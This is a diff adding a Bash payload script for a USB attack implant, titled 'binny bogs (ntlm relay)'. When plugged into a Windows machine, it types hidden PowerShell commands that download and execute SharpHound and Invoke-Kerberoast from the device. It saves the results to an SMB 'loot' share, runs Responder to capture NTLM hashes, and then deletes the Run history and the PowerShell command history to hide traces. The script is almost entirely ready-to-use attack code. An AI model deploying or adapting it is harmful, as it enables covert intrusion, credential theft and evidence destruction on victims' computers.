@@ -1,0 +1,127 @@
+#!/bin/bash
+#############################################################################
+# Title:                                                                    #
+#     binny bogs (ntlm relay)                    ..::-:--                   #
+#                                            .:-=   -:-                     #
+# Author:                                  :**='  -*+                       #             
+#     irrrwin                            .= +'   *+=                        #             
+#                                       .==+    .*-                         #         
+# Description:                          --+    .-++                         #         
+#     Starts http server to            :+-+   -+-*                          #         
+#     server scripts and an           .=:==   ==--                          #         
+#     SMB server for loot.           .=--+:-==*-+:.                         #         
+#     Launches 3 attacks:            --:*+=-  -- -=#*+===-=--.              #                     
+#     1) Run Sharphound.            :* --          -======-::==:            #                         
+#     2) Run Invoke-Kerberoast     :#-               -+-    ==:-+:          #                         
+#     3) Set up an ntlm relay      -+      -           + -     =-=-         #                         
+#        and try to catch some     :+     +#=         *+* +=    +-+.        #                             
+#        amount of hashes.         :+                     = =    ===.       #                             
+#                                   -=       ---=-- .-= =*+=+*-   ++:       #                             
+# Usage:                             +     -==:...+ .+==+:--..--=, +=.      #                             
+#     0. Set to Switch 2.            =-   +=....    :-:-:       .-= +:      #                             
+#     1. Plug in.                    --  +          :-:-:         =+ +.     #                             
+#     2. ...                         := -=                        ='= +:    #                                 
+#     3. Profit.                     --  ==:           :--:      --. =-+.   #                                 
+#                                    +    --=---==-::::.  .--:-::..   .=*=  #
+#                                   .+         =.                      .=*  #
+#                                   -=-      -==.                           #
+#                                   +::      +:                             #
+# Disclaimer:                                                               #
+#     *This program is free software: you can redistribute it and/or modify #
+#     it under the terms of the GNU General Public License as published by  #
+#     the Free Software Foundation, either version 3 of the License, or (at #
+#     your option) any later version.*                                      #
+#                                                                           #
+#     *You should have received a copy of the GNU General Public License    #
+#     along with this program. If not, see http://www.gnu.org/licenses/ *   #
+#                                                                           #
+#############################################################################
+
+
+# >>> SETTINGS >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+# ~~~~~~~~~~~~ EDIT BELOW ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+STAGE1="SharpHound.ps1"
+STAGE2="Invoke-Kerberoast.ps1"
+
+RESPONDER_OPTIONS="-I usb0 --lmv2 -F -w -r -d -f -v -P --lmv2-limit 10"
+# ~~~~~~~~~~~~ EDIT ABOVE ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+# <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<< SETTINGS <<<
+
+
+# >>> SETUP >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+LED SETUP
+ATTACKMODE RNDIS_ETHERNET HID
+
+GET HOST_IP
+GET SWITCH_POSITION
+GET TARGET_HOSTNAME
+GET TARGET_IP
+
+# GET HOSTNAME
+[[ -z "${TARGET_HOSTNAME}" ]] && TARGET_HOSTNAME="noname"
+
+# Set directories
+PAYLOAD_DIR="/root/udisk/payloads/${SWITCH_POSITION}"
+LOOT_DIR="/root/udisk/loot/${SWITCH_POSITION}"
+LOOT_SHARE="\\\\${HOST_IP}\\s"
+mkdir -p "${LOOT_DIR}"
+COUNT=$(ls -lad ${LOOT_DIR}/${TARGET_HOSTNAME}* | wc -l)
+COUNT=$((COUNT+1))
+SCAN_DIR="${LOOT_DIR}/${TARGET_HOSTNAME}-${COUNT}"
+mkdir -p "${SCAN_DIR}"
+
+cd "$PAYLOAD_DIR/src"
+
+# Start web server
+LOG_HTTP="${PAYLOAD_DIR}/http.log"
+touch "${LOG_HTTP}"
+gohttp -p 8080 > "${LOG_HTTP}" &
+
+# Start SMB server
+LOG_SMB="${PAYLOAD_DIR}/smb.log"
+touch "${LOG_SMB}"
+python /tools/impacket/examples/smbserver.py s "${SCAN_DIR}" -smb2support -p 1445 > "${LOG_SMB}" &
+
+Q $_JITTER_ENABLED = TRUE
+Q $_JITTER_MAX = 42
+
+Q DELAY 100
+# <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<< SETUP <<<
+
+
+# >>> STAGE 1 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+#
+LED STAGE1
+Q DELAY 500
+RUN WIN "powershell -w h -c \"iex(New-Object net.webclient).DownloadString('http://${HOST_IP}:8080/${STAGE1}')|Out-File '${LOOT_SHARE}:1445\\${STAGE1}.txt';if(\$?){ni -ItemType File -Path '${LOOT_SHARE}:1445\\_1'};exit\""
+Q DELAY 100
+# <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<< STAGE 1 <<<
+
+
+# >>> STAGE 2 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+LED STAGE2
+Q DELAY 500
+RUN WIN "powershell -w h -c \"iex(New-Object net.webclient).DownloadString('http://${HOST_IP}:8080/${STAGE2}')|Out-File '${LOOT_SHARE}:1445\\${STAGE2}.txt';if(\$?){ni -ItemType File -Path '${LOOT_SHARE}:1445\\_2'};exit\""
+Q DELAY 100
+# <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<< STAGE 2 <<<
+
+
+# >>> STAGE 3 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+# Run Responder
+python Responder.py "${RESPONDER_OPTIONS}" > "${SCAN_DIR}/Responder.txt"; wait $!; touch "${LOOT_SHARE}:1445\\_3" &
+# <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<< STAGE 3 <<<
+
+
+# >>> LOOT >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+LED SPECIAL
+while ! [ -f "$SCAN_DIR/_1" -a -f "$SCAN_DIR/_2" -a -f "$SCAN_DIR/_3" ]; do sleep 1; done
+# <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<< LOOT <<<
+
+
+# >>> CLEANUP >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+LED CLEANUP
+rm "$SCAN_DIR"/_*
+RUN WIN "powershell -w h -c \"reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /va /f; Remove-Item (Get-PSreadlineOption).HistorySavePath\""
+sync
+LED FINISH
+# <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<< CLEANUP <<<
